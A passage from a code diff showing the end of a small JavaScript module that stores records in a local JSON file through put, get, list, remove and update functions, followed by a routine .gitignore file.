+  fs.writeFileSync(TMP, JSON.stringify(map, null, 2));
+  fs.renameSync(TMP, FILE);
+}
+
+export function put(id, record) {
+  const all = loadAll();
+  all[id] = { ...(all[id] || {}), ...record };
+  saveAll(all);
+  return all[id];
+}
+
+export function get(id) {
+  return loadAll()[id] || null;
+}
+
+export function list() {
+  return Object.entries(loadAll()).map(([id, r]) => ({ id, ...r }));
+}
+
+export function remove(id) {
+  const all = loadAll();
+  delete all[id];
+  saveAll(all);
+}
+
+export function update(id, patch) {
+  const all = loadAll();
+  if (!all[id]) return null;
+  all[id] = { ...all[id], ...patch };
+  saveAll(all);
+  return all[id];
+}
+</file>
+
+<file path=".gitignore">
+node_modules/
+.env
+package-lock.json
+output/
+data/
+</file>
+
+</files>
